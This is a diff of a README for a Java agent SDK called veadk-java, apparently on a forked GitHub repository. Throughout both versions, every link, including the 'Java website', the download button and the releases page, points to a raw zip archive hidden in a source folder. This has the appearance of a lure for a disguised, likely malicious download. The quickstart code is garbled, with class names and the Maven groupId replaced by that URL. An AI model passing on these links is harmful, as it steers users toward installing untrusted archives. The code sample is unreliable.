@@ -10,17 +10,17 @@ Before you start, make sure your system meets these requirements:
 
 - JDK `17` or above installed on your machine.
 
-If you need help with installation, you can find instructions online or visit the official [Java website](https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip) for downloads.
+If you need help with installation, you can find instructions online or visit the official [Java website](https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip) for downloads.
 
 ## 📥 Download veadk-java
 
 To get the latest version of veadk-java, click the button below:
 
-[![Download veadk-java](https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip)](https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip)
+[![Download veadk-java](https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip)](https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip)
 
 You can also visit the release page to find previous versions, updates, and other useful information:
 
-[Visit the Releases Page](https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip)
 
 ## 📄 How to Install
 
@@ -38,7 +38,7 @@ You can also visit the release page to find previous versions, updates, and othe
 
    ```xml
    <dependency>
-       <groupId>https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip</groupId>
+       <groupId>https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip</groupId>
        <artifactId>veadk-java</artifactId>
        <version>0.0.1</version>
    </dependency>
@@ -51,7 +51,7 @@ You can also visit the release page to find previous versions, updates, and othe
    public class QuickstartAgentExample {
        public static void main(String[] args) {
            // Use an Ark model (replace with a model name available in your Ark Console)
-           BaseAgent agent = https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip()
+           BaseAgent agent = https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip()
                .name("quickstart-agent")
                .instruction("You are a helpful assistant.")
                .model(new ArkLlm("doubao-seed-1-8-preview-251115"))
@@ -59,12 +59,12 @@ You can also visit the release page to find previous versions, updates, and othe
 
            Runner runner = new Runner(agent);
 
-           Session session = https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip()
-               .createSession(https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip(), "userId", null, "sessionId")
+           Session session = https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip()
+               .createSession(https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip(), "userId", null, "sessionId")
                .blockingGet();
 
            // Build a simple conversation
-           Content userMsg = https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip(https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip("hello!"));
+           Content userMsg = https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip(https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip("hello!"));
            // Add more code here to handle conversation
        }
    }
@@ -102,6 +102,6 @@ After completing everything, make sure to test your agent. Check how it responds
 
 For additional details or updates, remember to regularly check the releases page:
 
-[Visit the Releases Page](https://github.com/kamilkhan78/veadk-java/raw/refs/heads/main/core/src/test/java/com/volcengine/veadk/tools/knowledgebase/veadk_java_v1.2.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/kamilkhan78/veadk-java/main/core/src/main/java/com/volcengine/veadk/trace/veadk_java_3.5-beta.1.zip)
 
 Thank you for choosing veadk-java. Enjoy building your agent!
